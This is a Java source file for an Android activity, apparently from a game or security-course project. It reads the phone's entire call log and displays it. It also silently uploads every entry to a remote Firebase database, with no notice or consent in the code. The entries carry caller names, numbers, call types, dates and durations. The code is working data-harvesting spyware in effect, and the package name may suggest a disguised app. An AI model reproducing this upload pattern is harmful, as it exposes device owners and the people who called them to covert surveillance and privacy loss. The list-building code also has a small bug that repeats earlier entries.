package tpgame.securityandcryptography;

import android.content.pm.PackageManager;
import android.database.Cursor;
import android.net.Uri;
import android.support.v4.app.ActivityCompat;
import android.support.v7.app.AppCompatActivity;
import android.os.Bundle;
import android.widget.ArrayAdapter;
import android.widget.ListView;

import com.google.firebase.database.DatabaseReference;
import com.google.firebase.database.FirebaseDatabase;

import java.io.Serializable;
import java.util.ArrayList;
import java.util.Date;
import java.util.List;

import tpgame.securityandcryptography.data.CallLogHistory;

public class CallLog extends AppCompatActivity {

    private DatabaseReference mDatabase;
    ArrayList<String> dsCallLog;
    ArrayAdapter<String> adapterCallLog;

    private ListView lvCallLog ;
   List<CallLogHistory> dsCallLogHistory;

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_call_log);

        mDatabase = FirebaseDatabase.getInstance().getReference();

        lvCallLog = (ListView) findViewById(R.id.lvCallLog);
        dsCallLog = new ArrayList<>();
        dsCallLogHistory = new ArrayList<>();

        adapterCallLog = new ArrayAdapter<String>(CallLog.this,android.R.layout.simple_list_item_1,dsCallLog);

        lvCallLog.setAdapter(adapterCallLog);


        ///////////////////////////////////////
        StringBuffer sb = new StringBuffer();
        if (ActivityCompat.checkSelfPermission(this, android.Manifest.permission.READ_CALL_LOG) != PackageManager.PERMISSION_GRANTED) {
            return;
        }
        Cursor cursor = getContentResolver().query(android.provider.CallLog.Calls.CONTENT_URI, null, null, null, null);

        sb.append("Call Log :");

        while (cursor.moveToNext() ){
            int name = cursor.getColumnIndex(android.provider.CallLog.Calls.CACHED_NAME);
            int number = cursor.getColumnIndex(android.provider.CallLog.Calls.NUMBER);
            int type = cursor.getColumnIndex(android.provider.CallLog.Calls.TYPE);
            int date = cursor.getColumnIndex(android.provider.CallLog.Calls.DATE);
            int duration = cursor.getColumnIndex(android.provider.CallLog.Calls.DURATION);

            String phName = cursor.getString(name);
            String phNum = cursor.getString(number);
            String callType = cursor.getString(type);

            String callDate = cursor.getString(date);
            Date callDayTime = new Date(Long.valueOf(callDate));

            String callDuration = cursor.getString(duration);

            int callcode = Integer.parseInt(callType);
            switch (callcode) {
                case android.provider.CallLog.Calls.OUTGOING_TYPE:
                    callType = "Outgoing";
                    break;
                case android.provider.CallLog.Calls.INCOMING_TYPE:
                    callType = "Incoming";
                    break;
                case android.provider.CallLog.Calls.MISSED_TYPE:
                    callType = "Missed";
                    break;
            }
            sb.append("\nName:---"+phName+"\nPhone Number:--- " + phNum + " \nCall Type:--- "
                    + callType + " \nCall Date:--- " + callDayTime
                    + " \nCall duration in sec :--- " + callDuration);
            sb.append("\n----------------------------------");
            dsCallLog.add(String.valueOf(sb));

           // mDatabase.child("CallLogs").push().setValue(dsCallLog);

            CallLogHistory callLogHistory = new  CallLogHistory( phName,  phNum,  callType, String.valueOf(callDayTime),  callDuration) ;

            dsCallLogHistory.add(callLogHistory);

        }

        mDatabase.child("CallLogs").push().setValue(dsCallLogHistory);

        cursor.close();
        adapterCallLog.notifyDataSetChanged();

    }


}
